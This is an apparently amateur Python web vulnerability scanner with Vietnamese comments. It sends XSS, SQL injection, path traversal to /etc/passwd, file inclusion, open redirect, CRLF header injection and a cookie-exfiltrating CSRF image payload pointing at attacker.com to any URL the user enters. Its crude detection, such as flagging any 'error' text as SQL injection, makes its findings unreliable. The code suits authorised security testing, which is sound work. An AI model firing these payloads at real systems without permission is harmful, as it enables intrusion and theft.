import requests
from bs4 import BeautifulSoup
import re
import json
import time
import ssl
import socket
import shodan

class WebVulnerabilityScanner:
    def __init__(self, target_url, proxies=None, session_cookies=None):
        self.target_url = target_url
        self.found_vulnerabilities = []
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        }
        self.proxies = proxies if proxies else {}
        self.session = requests.Session()
        if session_cookies:
            self.session.cookies.update(session_cookies)

    # Kiểm tra XSS
    def scan_xss(self):
        xss_payloads = ["<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>"]
        for payload in xss_payloads:
            url = f"{self.target_url}?search={payload}"
            response = self.session.get(url, headers=self.headers, proxies=self.proxies)
            if payload in response.text:
                self.found_vulnerabilities.append(f"XSS Vulnerability found with payload: {payload}")

    # Kiểm tra SQL Injection
    def scan_sql_injection(self):
        sql_payloads = ["' OR 1=1 --", "' OR 'a'='a", '" OR "1"="1']
        for payload in sql_payloads:
            url = f"{self.target_url}?id={payload}"
            response = self.session.get(url, headers=self.headers, proxies=self.proxies)
            if "SQL syntax" in response.text or "error" in response.text.lower():
                self.found_vulnerabilities.append(f"SQL Injection Vulnerability found with payload: {payload}")

    # Kiểm tra Directory Traversal
    def scan_directory_traversal(self):
        traversal_payloads = ["../../../../etc/passwd", "../windows/system32/cmd.exe"]
        for payload in traversal_payloads:
            url = f"{self.target_url}/{payload}"
            response = self.session.get(url, headers=self.headers, proxies=self.proxies)
            if "root:x:" in response.text or "CMD.EXE" in response.text:
                self.found_vulnerabilities.append(f"Directory Traversal Vulnerability found with payload: {payload}")

    # Kiểm tra File Inclusion
    def scan_file_inclusion(self):
        file_inclusion_payloads = ["php://input", "file:///etc/passwd"]
        for payload in file_inclusion_payloads:
            url = f"{self.target_url}?file={payload}"
            response = self.session.get(url, headers=self.headers, proxies=self.proxies)
            if "root:x:" in response.text:
                self.found_vulnerabilities.append(f"File Inclusion Vulnerability found with payload: {payload}")

    # Kiểm tra Open Redirect
    def scan_open_redirect(self):
        redirect_payloads = ["https://attacker.com"]
        for payload in redirect_payloads:
            url = f"{self.target_url}?redirect={payload}"
            response = self.session.get(url, headers=self.headers, proxies=self.proxies, allow_redirects=False)
            if "location" in response.headers and payload in response.headers["location"]:
                self.found_vulnerabilities.append(f"Open Redirect Vulnerability found with payload: {payload}")

    # Kiểm tra CSRF với POST request
    def scan_csrf_post(self):
        csrf_payload = {"data": "<img src='http://attacker.com/csrf?cookie=" + requests.utils.quote(self.target_url) + "'>"}
        url = self.target_url
        response = self.session.post(url, headers=self.headers, proxies=self.proxies, data=csrf_payload)
        if "success" in response.text.lower():
            self.found_vulnerabilities.append("Possible CSRF Vulnerability detected via POST")

    # Kiểm tra Header Injection
    def scan_header_injection(self):
        header_payloads = ["%0d%0aSet-Cookie:csrf-token=malicious"]
        for payload in header_payloads:
            headers = self.headers.copy()
            headers["X-Forwarded-For"] = payload
            response = self.session.get(self.target_url, headers=headers, proxies=self.proxies)
            if "Set-Cookie" in response.headers:
                self.found_vulnerabilities.append(f"Header Injection Vulnerability found with payload: {payload}")

    # Kiểm tra cấu hình SSL/TLS
    def scan_ssl_tls(self):
        hostname = self.target_url.replace("http://", "").replace("https://", "").split("/")[0]
        context = ssl.create_default_context()
        
        try:
            with socket.create_connection((hostname, 443)) as sock:
                with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                    cert = ssock.getpeercert()
                    ssl_version = ssock.version()
                    cipher = ssock.cipher()
                    
                    if ssl_version in ['TLSv1', 'TLSv1.1']:
                        self.found_vulnerabilities.append(f"Weak TLS version used: {ssl_version}")
                    if not cert:
                        self.found_vulnerabilities.append("No SSL certificate found.")
                    
                    print(f"SSL Version: {ssl_version}")
                    print(f"Cipher: {cipher}")
        except Exception as e:
            print(f"Error checking SSL/TLS: {e}")

    # Kiểm tra phiên bản phần mềm của server
    def scan_server_version(self):
        response = self.session.get(self.target_url, headers=self.headers, proxies=self.proxies)
        server_header = response.headers.get("Server", "")
        powered_by_header = response.headers.get("X-Powered-By", "")

        if server_header:
            self.found_vulnerabilities.append(f"Server version found: {server_header}")
        if powered_by_header:
            self.found_vulnerabilities.append(f"X-Powered-By: {powered_by_header}")

    # Tích hợp Shodan API để tìm kiếm thông tin server
    def scan_shodan(self, shodan_api_key):
        api = shodan.Shodan(shodan_api_key)
        hostname = self.target_url.replace("http://", "").replace("https://", "").split("/")[0]
        try:
            result = api.host(hostname)
            if result:
                self.found_vulnerabilities.append(f"Shodan scan found: {result}")
        except shodan.APIError as e:
            print(f"Shodan API Error: {e}")

    # Báo cáo kết quả
    def report(self, output_format="text"):
        if output_format == "json":
            with open("vulnerability_report.json", "w") as report_file:
                json.dump(self.found_vulnerabilities, report_file, indent=4)
            print("Report saved as vulnerability_report.json")
        elif output_format == "html":
            with open("vulnerability_report.html", "w") as report_file:
                report_file.write("<html><body><h1>Vulnerability Report</h1><ul>")
                for vulnerability in self.found_vulnerabilities:
                    report_file.write(f"<li>{vulnerability}</li>")
                report_file.write("</ul></body></html>")
            print("Report saved as vulnerability_report.html")
        else:
            if self.found_vulnerabilities:
                print("Vulnerabilities found:")
                for vulnerability in self.found_vulnerabilities:
                    print(f"- {vulnerability}")
            else:
                print("No vulnerabilities found.")

if __name__ == "__main__":
    target = input("Enter the target URL: ")
    proxies_input = input("Enter proxy (optional, leave blank if none): ")
    proxies = {"http": proxies_input, "https": proxies_input} if proxies_input else None
    shodan_api_key = input("Enter Shodan API Key (optional, leave blank if none): ")
    
    scanner = WebVulnerabilityScanner(target, proxies=proxies)
    
    start_time = time.time()

    print("Scanning for vulnerabilities...")
    scanner.scan_xss()
    scanner.scan_sql_injection()
    scanner.scan_directory_traversal()
    scanner.scan_file_inclusion()
    scanner.scan_open_redirect()
    scanner.scan_csrf_post()
    scanner.scan_header_injection()
    scanner.scan_ssl_tls()
    scanner.scan_server_version()
    
    if shodan_api_key:
        scanner.scan_shodan(shodan_api_key)

    # Report
    output_format = input("Enter output format (text, json, html): ")
    scanner.report(output_format)

    elapsed_time = time.time() - start_time
    print(f"Scan completed in {elapsed_time:.2f} seconds")